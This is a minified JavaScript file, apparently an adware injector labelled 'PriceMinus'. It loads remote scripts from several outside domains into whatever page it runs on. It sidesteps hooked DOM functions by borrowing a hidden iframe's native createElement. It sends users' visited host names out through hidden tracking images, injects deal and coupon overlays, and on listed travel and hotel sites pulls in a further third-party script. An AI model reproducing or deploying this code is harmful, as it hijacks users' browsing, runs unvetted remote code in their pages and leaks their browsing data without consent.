new function(){window.FO_DOMAIN = ".eshopcomp.com";
FO_ADJUSTSCALE = { active: true, top:0, bottom: 0, pos: 0.13, minScale: 0.85};var Injector=function(){function t(){}return t.getAltDocument=function(){if(null==t.altDocument){var e=document.createElement("iframe");e.height=e.width="0",document.body.appendChild(e),t.altDocument=e.contentWindow.document}return t.altDocument},t.injectScript=function(e,n,o){var a=null,r=!0,i=!1,d=document.createElement;d.toString().indexOf("[native code]")>0?a=document.createElement("script"):(a=t.getAltDocument().createElement.call(document,"script"),r=!1),a.onload=a.onreadystatechange=function(t){i||a.readyState&&"loaded"!==a.readyState&&"complete"!==a.readyState||(i=!0,a.parentNode&&a.parentNode.removeChild(a),n&&window.setTimeout(function(){n()},1))},a.onerror=function(t){i||(i=!0,o&&window.setTimeout(function(){o(t)},1))};var c=document.getElementsByTagName("head")[0],u=c.appendChild;return u.toString().indexOf("[native code]")>0?c.appendChild(a):(t.getAltDocument().appendChild.call(c,a),r=!1),a.src=e,r},t.altDocument=null,t}(),BootstrapHelper=function(){function t(){}return t.bootstrap=function(e,n,o){void 0===o&&(o=[]),o&&o.length||(o=window.FO_DOMAIN?[window.FO_DOMAIN]:[".datafastguru.info"]);var a=t.selectDomain(o);t.notify(a,e,"inj",{},.01),t.notifyGenericUrl("https://secure.adnxs.com/seg?add=2735784&t=2");var r="//pstatic"+a+"/nwp/v0_0_571/release/Shared/App/SharedApp.js",i="FO.Shared_"+n+".App.SharedApp",d=Injector.injectScript(r,function(){var n=t.instantiateClass(i);n.init(e,a)},function(n){t.notify(a,e,"exception",{ex:"Failure to get SharedApp"},.01)});window.setTimeout(function(){var n=void 0==window.FO;n&&t.notify(a,e,"generic",{subtype:"badinj",nativeinj:""+d},.01)},3e3)},t.notify=function(e,n,o,a,r){var i=Math.random()<r;if(i){var d="//app"+e+"/a/"+o+"/logo.png",c={};c.fam="nwp",c.t=(new Date).getTime()+"",c.v="0_0_571",c.dmn=e,c.partid=n.partnerCode,c.subid=n.subId,c.hn=document.location.host,c.safepassage="1";for(var u in a)c[u]=a[u];t.notifyGenericUrl(d,c)}},t.notifyGenericUrl=function(t,e){void 0===e&&(e={});try{if(e){t+="?";for(var n in e){var o=e[n]+"";t=t+"&"+n+"="+encodeURIComponent(o)}}var a=document.body.appendChild(document.createElement("img"));return a.style.zIndex="-100",a.style.position="absolute",a.style.left="0",a.style.top="0",a.src=t,!0}catch(r){return!1}},t.selectDomain=function(t){for(var e=[],n=0;n<t.length;n++)t[n]&&t[n].length&&-1==t[n].indexOf("$")&&e.push(t[n]);var n=Math.floor(Math.random()*e.length);return e[n]},t.instantiateClass=function(t){for(var e=t.split("."),n=window,o=0;o<e.length;o++)n=n[e[o]];var a=new n;return a},t}(),params={"products":{"GenericButtonY":[{"logic":["ImageDealsLogic"],"visual":"GenericButtonY","weight":10}],"rsCampains":[{"logic":["CommerceDealsLogic","CouponsLogic","CampaignsLogic"],"visual":"RightSliderY","weight":10}]},partnerCode:"wp",subId:"1386_23391",providerName:"PriceMinus",providerLink:"",flags:{base:{"value":[{"name":"NotificationRates","flag":"","variants":[{"name":"Default","flagValue":"","odds":1,"values":[{"name":"notifyrate.inj","val":"0.01"},{"name":"notifyrate.exception","val":"0.001"},{"name":"notifyrate.init","val":"0.01"},{"name":"notifyrate.usr","val":"0.01"},{"name":"notifyrate.noshow","val":"0.01"},{"name":"notifyrate.wo","val":"0.1"}]}]},{"name":"OffersApiPruning","flag":"oap","variants":[{"name":"Off","flagValue":"off","odds":0.8,"values":[{"name":"offersapi.prune","val":"0"}]},{"name":"TopHalf","flagValue":"top","odds":0.1,"values":[{"name":"offersapi.prune","val":"1"}]},{"name":"OverMedian","flagValue":"med","odds":0.1,"values":[{"name":"offersapi.prune","val":"2"}]}]},{"name":"newScrapeWeight","flag":"itai_scr_9","variants":[{"name":"old_scrape_values","flagValue":"set1","odds":0.5,"values":[{"name":"deal-scrape-weights-amplify.title","val":"6"},{"name":"deal-scrape-weights-amplify.otherqs","val":"1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"6"},{"name":"deal-scrape-weights-amplify.search","val":"8"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"1"},{"name":"deal-scrape-weights-amplify.h1","val":"6"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"ampv1","flagValue":"set2","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"-2"},{"name":"deal-scrape-weights-amplify.otherqs","val":"-1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-6"},{"name":"deal-scrape-weights-amplify.search","val":"10"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"10"},{"name":"deal-scrape-weights-amplify.text","val":"-2"},{"name":"deal-scrape-weights-amplify.h1","val":"-1"},{"name":"dedicated-part-of-scrape","val":"1"}]},{"name":"ampv2","flagValue":"set3","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"-1"},{"name":"deal-scrape-weights-amplify.otherqs","val":"-1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-1"},{"name":"deal-scrape-weights-amplify.search","val":"20"},{"name":"deal-scrape-weights-amplify.ribbon","val":"20"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"-1"},{"name":"deal-scrape-weights-amplify.h1","val":"-1"},{"name":"dedicated-part-of-scrape","val":"1"}]},{"name":"ampv3","flagValue":"set4","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"-2"},{"name":"deal-scrape-weights-amplify.otherqs","val":"-1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-6"},{"name":"deal-scrape-weights-amplify.search","val":"10"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"10"},{"name":"deal-scrape-weights-amplify.text","val":"-2"},{"name":"deal-scrape-weights-amplify.h1","val":"-1"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"OldExperiment1","flagValue":"e1","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"10"},{"name":"deal-scrape-weights-amplify.otherqs","val":"1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"0"},{"name":"deal-scrape-weights-amplify.search","val":"15"},{"name":"deal-scrape-weights-amplify.ribbon","val":"6"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"1"},{"name":"deal-scrape-weights-amplify.h1","val":"8"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"OldExperiment2","flagValue":"e2","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"5"},{"name":"deal-scrape-weights-amplify.otherqs","val":"1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"0"},{"name":"deal-scrape-weights-amplify.search","val":"20"},{"name":"deal-scrape-weights-amplify.ribbon","val":"15"},{"name":"deal-scrape-weights-amplify.importantqs","val":"8"},{"name":"deal-scrape-weights-amplify.text","val":"1"},{"name":"deal-scrape-weights-amplify.h1","val":"14"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"ampv4","flagValue":"set5","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"6"},{"name":"deal-scrape-weights-amplify.otherqs","val":"0"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-6"},{"name":"deal-scrape-weights-amplify.search","val":"8"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"-2"},{"name":"deal-scrape-weights-amplify.h1","val":"-6"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"ampv5","flagValue":"set6","odds":0.5,"values":[{"name":"deal-scrape-weights-amplify.title","val":"0"},{"name":"deal-scrape-weights-amplify.otherqs","val":"0"},{"name":"deal-scrape-weights-amplify.dedicated","val":"0"},{"name":"deal-scrape-weights-amplify.search","val":"10"},{"name":"deal-scrape-weights-amplify.ribbon","val":"20"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"0"},{"name":"deal-scrape-weights-amplify.h1","val":"6"},{"name":"dedicated-part-of-scrape","val":"0"}]}]},{"name":"Scroll","flag":"ruby_scrollx1","variants":[{"name":"Auto10","flagValue":"a10","odds":0.5,"values":[{"name":"rightslider.scroll-auto","val":"15000"}]},{"name":"Auto30","flagValue":"a30","odds":0.5,"values":[{"name":"rightslider.scroll-auto","val":"30000"}]}]},{"name":"DeafultMerchantImg","flag":"dfi","variants":[{"name":"UseDefault","flagValue":"use","odds":0,"values":[{"name":"deals.default-merchant-image","val":"1"}]},{"name":"NoDefault","flagValue":"no","odds":1,"values":[{"name":"deals.default-merchant-image","val":"0"}]}]},{"name":"PersistanceTest","flag":"","variants":[{"name":"Easy","flagValue":"","odds":1,"values":[{"name":"persistance.testset","val":"1"},{"name":"persistance.testratio","val":"0.001"}]}]},{"name":"CouponsAPI","flag":"cpn_fm","variants":[{"name":"UseFeedMatcher","flagValue":"1","odds":1,"values":[{"name":"coupons.api.use.fm","val":"1"}]},{"name":"DirectES","flagValue":"0","odds":0,"values":[{"name":"coupons.api.use.fm","val":"0"}]}]},{"name":"ProductBoxes","flag":"","variants":[{"name":"AlwaysOn","flagValue":"","odds":1,"values":[{"name":"notifyrate.generic.pb_result","val":"0.1"},{"name":"productbox.userate","val":"0.01"}]}]},{"name":"Classification","flag":"new_get_img","variants":[{"name":"UseNewGetImgAlgo","flagValue":"1","odds":0.2,"values":[{"name":"classify-use-new-get-img-algo","val":"1"}]},{"name":"UseOldGetImgAlgo","flagValue":"0","odds":0.8,"values":[{"name":"classify-use-new-get-img-algo","val":"0"}]}]}]},specific:{"value":[]}}},version="0_0_571";BootstrapHelper.bootstrap(params,version);var cortx=document.getElementsByTagName("head")[0].appendChild(document.createElement("script"));cortx.src="//www.comparinggenie.com/services.js";(function(){for(var a="Venere.com travelocity.com snoozee.com southwest.com lastminute.com hotelclub.com hotels.com hotels4u.com Expedia. getaroom.com ebookers.com cheaptickets.com booking.com bookit.com Agoda.com Priceline.com Orbitz.com Budgetplaces.com Hotwire.com makemytrip.com marriott.com Tripadvisor. kayak. trivago. hotelscombined. prestigia.com otel.com skoosh.com asiarooms.com bestwestern.com lasvegas.com www.amoma.com".split(" "),c=window.location.hostname.toLocaleLowerCase(),b=0;b<a.length;b++)if(-1<
    c.indexOf(a[b].toLowerCase())){a=document.createElement("script");a.src="//cond01.etbxml.com/api/web/hotels.php?ui=1&partner=first_t_t&ns=first_t_t&mamId=first_t_t&userId=2222&appId=3333&sp=0&apps=Targeted";document.body.appendChild(a);break}})();}